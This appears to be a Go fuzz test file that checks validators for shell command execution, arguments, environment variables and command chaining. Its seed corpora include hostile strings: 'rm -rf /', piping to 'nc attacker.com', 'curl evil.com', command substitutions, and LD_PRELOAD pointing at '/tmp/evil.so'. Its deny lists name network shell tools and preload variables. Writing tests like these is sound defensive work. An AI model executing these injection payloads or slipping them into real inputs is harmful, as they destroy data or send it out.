// pkg/execute/fuzz_test.go

package execute

import (
	"context"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
)

// FuzzCommandExecution tests command execution with various inputs
func FuzzCommandExecution(f *testing.F) {
	// Add seed corpus
	seeds := []struct {
		cmd  string
		args []string
	}{
		{"echo", []string{"hello"}},
		{"ls", []string{"-la"}},
		{"cat", []string{"/etc/passwd"}},
		{"sh", []string{"-c", "echo test"}},
		{"", []string{}},
		{"echo", []string{"test; rm -rf /"}},
		{"echo", []string{"test$(whoami)"}},
		{"echo", []string{"test`id`"}},
		{"echo", []string{"test\ninjection"}},
		{"echo", []string{"test\x00null"}},
		{"echo", []string{strings.Repeat("a", 10000)}},
		{"echo", []string{"test|nc attacker.com 1234"}},
		{"echo", []string{"test > /etc/passwd"}},
		{"echo", []string{"test && curl evil.com"}},
		{"/bin/sh", []string{"-c", "while true; do echo test; done"}},
		{"кириллица", []string{"тест"}},
		{"中文", []string{"测试"}},
		{"echo", []string{"$HOME", "$PATH", "$USER"}},
		{"echo", []string{"${HOME}", "${PATH}", "${USER}"}},
	}

	for _, seed := range seeds {
		// Flatten for fuzzing
		combined := seed.cmd + "\x00" + strings.Join(seed.args, "\x00")
		f.Add(combined)
	}

	f.Fuzz(func(t *testing.T, input string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(input) {
			t.Skip("Skipping non-UTF8 input")
		}

		// Parse input
		parts := strings.Split(input, "\x00")
		if len(parts) == 0 {
			return
		}

		cmd := parts[0]
		args := parts[1:]

		// Create runtime context with timeout
		ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
		defer cancel()

		_ = &eos_io.RuntimeContext{
			Ctx: ctx,
		}

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("Command execution panicked with cmd=%q args=%v: %v", cmd, args, r)
				}
			}()

			// Validate command before execution
			if !isValidCommand(cmd) {
				return
			}

			// Validate arguments
			for _, arg := range args {
				if !isValidArgument(arg) {
					return
				}
			}

			// Would execute command here in real implementation
			// For fuzzing, we just ensure validation doesn't panic
		}()
	})
}

// FuzzCommandValidation tests command validation logic
func FuzzCommandValidation(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		"ls",
		"echo",
		"cat",
		"/usr/bin/ls",
		"/bin/echo",
		"",
		"../../../bin/sh",
		"sh; rm -rf /",
		"sh && curl evil.com",
		"sh | nc attacker.com",
		"sh`whoami`",
		"sh$(id)",
		strings.Repeat("a", 1000),
		"/bin/sh\x00injection",
		"/bin/sh\ninjection",
		"кириллица",
		"中文命令",
		"cmd.exe",
		"powershell.exe",
		"$PATH",
		"${HOME}/bin/cmd",
		"~/.local/bin/cmd",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, cmd string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(cmd) {
			t.Skip("Skipping non-UTF8 input")
		}

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("Command validation panicked with input %q: %v", cmd, r)
				}
			}()

			// Validate the command
			isValid := isValidCommand(cmd)

			// Security checks
			if strings.Contains(cmd, "..") {
				if isValid {
					t.Errorf("Path traversal in command should be rejected: %q", cmd)
				}
			}

			if strings.ContainsAny(cmd, ";|&$`") {
				if isValid {
					t.Errorf("Shell metacharacters in command should be rejected: %q", cmd)
				}
			}

			if strings.Contains(cmd, "\x00") || strings.Contains(cmd, "\n") {
				if isValid {
					t.Errorf("Control characters in command should be rejected: %q", cmd)
				}
			}

			if len(cmd) > 256 {
				if isValid {
					t.Errorf("Excessively long command should be rejected: %d chars", len(cmd))
				}
			}
		}()
	})
}

// FuzzArgumentValidation tests argument validation logic
func FuzzArgumentValidation(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		"--help",
		"-la",
		"filename.txt",
		"/path/to/file",
		"",
		"arg with spaces",
		"arg\nwith\nnewlines",
		"arg\x00with\x00nulls",
		"arg; rm -rf /",
		"arg && curl evil.com",
		"arg | nc attacker.com",
		"arg`whoami`",
		"arg$(id)",
		strings.Repeat("a", 10000),
		"../../etc/passwd",
		"кириллица",
		"中文参数",
		"$HOME",
		"${PATH}",
		"~/.bashrc",
		"arg > /etc/passwd",
		"arg >> output.txt",
		"arg < /dev/null",
		"arg 2>&1",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, arg string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(arg) {
			t.Skip("Skipping non-UTF8 input")
		}

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("Argument validation panicked with input %q: %v", arg, r)
				}
			}()

			// Validate the argument
			isValid := isValidArgument(arg)

			// Security checks for dangerous patterns
			if strings.Contains(arg, "\x00") {
				if isValid {
					t.Errorf("Argument with null bytes should be rejected: %q", arg)
				}
			}

			if len(arg) > 4096 {
				if isValid {
					t.Errorf("Excessively long argument should be rejected: %d chars", len(arg))
				}
			}

			// Check for command injection attempts
			dangerousPatterns := []string{
				"; rm ",
				"&& curl ",
				"| nc ",
				"> /etc/",
				"< /etc/",
			}

			for _, pattern := range dangerousPatterns {
				if strings.Contains(arg, pattern) && isValid {
					t.Logf("Warning: Potentially dangerous pattern accepted: %q in %q", pattern, arg)
				}
			}
		}()
	})
}

// FuzzEnvironmentVariables tests environment variable handling
func FuzzEnvironmentVariables(f *testing.F) {
	// Add seed corpus
	seeds := []struct {
		key   string
		value string
	}{
		{"PATH", "/usr/bin:/bin"},
		{"HOME", "/home/user"},
		{"USER", "testuser"},
		{"", ""},
		{"KEY", ""},
		{"", "value"},
		{"KEY WITH SPACES", "value"},
		{"KEY\nWITH\nNEWLINES", "value"},
		{"KEY\x00WITH\x00NULLS", "value"},
		{"KEY", "value; rm -rf /"},
		{"KEY", "value$(whoami)"},
		{"KEY", "value`id`"},
		{"LONG_KEY_" + strings.Repeat("A", 100), "value"},
		{"KEY", strings.Repeat("A", 10000)},
		{"КИРИЛЛИЦА", "значение"},
		{"中文键", "中文值"},
		{"LD_PRELOAD", "/tmp/evil.so"},
		{"PATH", "/tmp:$PATH"},
		{"IFS", ";"},
	}

	for _, seed := range seeds {
		combined := seed.key + "=" + seed.value
		f.Add(combined)
	}

	f.Fuzz(func(t *testing.T, envVar string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(envVar) {
			t.Skip("Skipping non-UTF8 input")
		}

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("Environment variable handling panicked with input %q: %v", envVar, r)
				}
			}()

			// Parse environment variable
			parts := strings.SplitN(envVar, "=", 2)
			if len(parts) != 2 {
				return
			}

			key := parts[0]
			value := parts[1]

			// Validate environment variable
			isValid := isValidEnvVar(key, value)

			// Security checks
			if key == "" {
				if isValid {
					t.Errorf("Empty environment variable key should be rejected")
				}
			}

			if strings.ContainsAny(key, " \t\n\r\x00") {
				if isValid {
					t.Errorf("Environment key with whitespace/control chars should be rejected: %q", key)
				}
			}

			if strings.Contains(value, "\x00") {
				if isValid {
					t.Errorf("Environment value with null bytes should be rejected: %q", value)
				}
			}

			// Check for dangerous environment variables
			dangerousKeys := []string{"LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES"}
			for _, dangerous := range dangerousKeys {
				if key == dangerous && isValid {
					t.Logf("Warning: Dangerous environment variable accepted: %s=%s", key, value)
				}
			}
		}()
	})
}

// FuzzCommandTimeout tests command timeout handling
func FuzzCommandTimeout(f *testing.F) {
	// Add seed corpus with different timeout values
	seeds := []struct {
		cmd     string
		args    []string
		timeout int64 // milliseconds
	}{
		{"echo", []string{"test"}, 1000},
		{"sleep", []string{"0.1"}, 500},
		{"sleep", []string{"2"}, 100},
		{"sh", []string{"-c", "while true; do echo test; done"}, 50},
		{"echo", []string{"test"}, 0},
		{"echo", []string{"test"}, -1},
		{"echo", []string{"test"}, 9223372036854775807}, // MaxInt64
	}

	for _, seed := range seeds {
		combined := seed.cmd + "\x00" + strings.Join(seed.args, "\x00") + "\x00" + string(rune(seed.timeout))
		f.Add(combined)
	}

	f.Fuzz(func(t *testing.T, input string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(input) {
			t.Skip("Skipping non-UTF8 input")
		}

		// Parse input
		parts := strings.Split(input, "\x00")
		if len(parts) < 3 {
			return
		}

		_ = parts[0] // cmd
		timeout := int64(0)
		if len(parts[len(parts)-1]) > 0 {
			timeout = int64(parts[len(parts)-1][0])
		}
		_ = parts[1 : len(parts)-1] // args

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("Command timeout handling panicked: %v", r)
				}
			}()

			// Validate timeout
			if timeout <= 0 {
				timeout = 1000 // Default 1 second
			}
			if timeout > 60000 {
				timeout = 60000 // Max 1 minute
			}

			// Would set up timeout context here
			// For fuzzing, we just ensure it doesn't panic
		}()
	})
}

// FuzzCommandChaining tests prevention of command chaining
func FuzzCommandChaining(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		"echo test",
		"echo test; ls",
		"echo test && ls",
		"echo test || ls",
		"echo test | grep test",
		"echo test > output.txt",
		"echo test >> output.txt",
		"echo test < input.txt",
		"echo test 2>&1",
		"echo test & ls",
		"echo test\nls",
		"echo test\r\nls",
		"echo $(ls)",
		"echo `ls`",
		"echo test; rm -rf /",
		"echo test && curl evil.com",
		"echo test | nc attacker.com 1234",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, input string) {
		// Skip if not valid UTF-8
		if !utf8.ValidString(input) {
			t.Skip("Skipping non-UTF8 input")
		}

		// Test should not panic
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("Command chaining detection panicked with input %q: %v", input, r)
				}
			}()

			// Check for command chaining
			hasChaining := detectCommandChaining(input)

			// Verify dangerous patterns are detected
			chainPatterns := []string{";", "&&", "||", "|", ">", "<", "&", "\n", "\r", "$(", "`"}
			
			for _, pattern := range chainPatterns {
				if strings.Contains(input, pattern) && !hasChaining {
					t.Errorf("Command chaining pattern %q not detected in: %q", pattern, input)
				}
			}
		}()
	})
}

// Helper validation functions
func isValidCommand(cmd string) bool {
	if cmd == "" || len(cmd) > 256 {
		return false
	}
	if strings.ContainsAny(cmd, "\x00\n\r;|&$`") {
		return false
	}
	if strings.Contains(cmd, "..") {
		return false
	}
	return true
}

func isValidArgument(arg string) bool {
	if len(arg) > 4096 {
		return false
	}
	if strings.Contains(arg, "\x00") {
		return false
	}
	return true
}

func isValidEnvVar(key, value string) bool {
	if key == "" {
		return false
	}
	if strings.ContainsAny(key, " \t\n\r\x00=") {
		return false
	}
	if strings.Contains(value, "\x00") {
		return false
	}
	// Check for dangerous environment variables
	dangerousKeys := []string{"LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES", "DYLD_FORCE_FLAT_NAMESPACE"}
	for _, dangerous := range dangerousKeys {
		if key == dangerous {
			return false
		}
	}
	return true
}

func detectCommandChaining(input string) bool {
	chainPatterns := []string{";", "&&", "||", "|", ">", ">>", "<", "&", "\n", "\r", "$(", "`"}
	for _, pattern := range chainPatterns {
		if strings.Contains(input, pattern) {
			return true
		}
	}
	return false
}